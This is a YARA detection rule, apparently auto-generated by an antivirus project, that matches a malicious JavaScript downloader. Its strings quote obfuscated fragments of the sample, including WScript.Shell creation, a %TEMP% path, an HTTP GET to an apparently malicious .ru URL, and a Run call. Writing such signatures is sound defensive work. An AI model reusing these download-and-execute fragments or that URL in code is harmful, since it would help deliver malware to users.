rule sig_20160427_19c446b5044fe8e4cdf884186bc2a85a {
  meta:
    description = "datamaliciousorder - file 20160427_19c446b5044fe8e4cdf884186bc2a85a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0f3c35721fc00cadcc1e3d0aab1899f3cbb44afad258e3c3aa5c4503e9fa7263"

  strings:
    $s1  = "function MrntgTwttv() {return BbqztWsaci[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ml1ZIbQ" ascii
    $s2  = "function MrntgTwttv() {return BbqztWsaci[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ml1ZIbQ" ascii
    $s3  = "var BbqztWsaci = function CzfzsAhggz() {return XblayTqrgx[PneqzXqjjk](\"WScript\"+\".Shell\");}(), NjkgmLgonm = 11;" fullword ascii
    $s4  = "function NwavqZpsfn(XambxMtqxc, UphzaYtfzw){JglmnAsvic = JglmnAsvic * 1; return XambxMtqxc - UphzaYtfzw;};" fullword ascii
    $s5  = "AabsiHmfjo[EwwmeDftwd](\"G\" + \"ET\", \"http://warcraft-lich-king.ru/i4ospd\", false);" fullword ascii
    $s6  = "var XblayTqrgx = this[\"WScript\"];" fullword ascii
    $s7  = "function IblrjXuspy(){return PneqzXqjjk;};" fullword ascii
    $s8  = "if (AabsiHmfjo[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function BwpdqNzuqm(){return CqlveAuajq + \"\";};" fullword ascii
    $s10 = "function EsxepCmaej() {return ((ClnruFfymd == true) && (ClnruFfymd == VjtinClays)) ? 1 : JglmnAsvic;};" fullword ascii
    $s11 = "function BvaxoRuvpk()" fullword ascii
    $s12 = "ClnruFfymd = true; " fullword ascii
    $s13 = "function IludrDklzx(JwrgdAybbj){BbqztWsaci[\"R\"+\"un\"](JwrgdAybbj, JglmnAsvic, JglmnAsvic);};" fullword ascii
    $s14 = "var VjtinClays = false;" fullword ascii
    $s15 = "function QdvplExjid(LmtvmWdgkm) {var MgjuqTuujc = (1, 2, 3, 4, 5, LmtvmWdgkm); return MgjuqTuujc;};" fullword ascii
    $s16 = "return NwavqZpsfn(OazacUrjrm, UbfyvYsadd);" fullword ascii
    $s17 = "TnkqwStpiy = true;" fullword ascii
    $s18 = "}while (NfgdhTmoia);" fullword ascii
    $s19 = "var DyeagDknyo = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "var TnkqwStpiy = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}